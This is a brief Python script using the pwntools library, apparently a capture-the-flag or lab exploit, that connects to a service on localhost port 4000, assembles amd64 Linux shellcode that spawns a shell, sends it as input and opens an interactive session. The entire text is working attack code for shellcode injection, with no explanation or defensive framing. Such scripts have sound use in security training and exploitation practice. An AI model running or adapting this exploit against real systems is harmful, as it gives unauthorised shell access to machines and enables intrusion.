from pwn import *

context.update(arch='amd64', os='linux')

r = remote('localhost', 4000)

shellcode = asm(shellcraft.sh())

r.sendline(shellcode)

r.interactive()
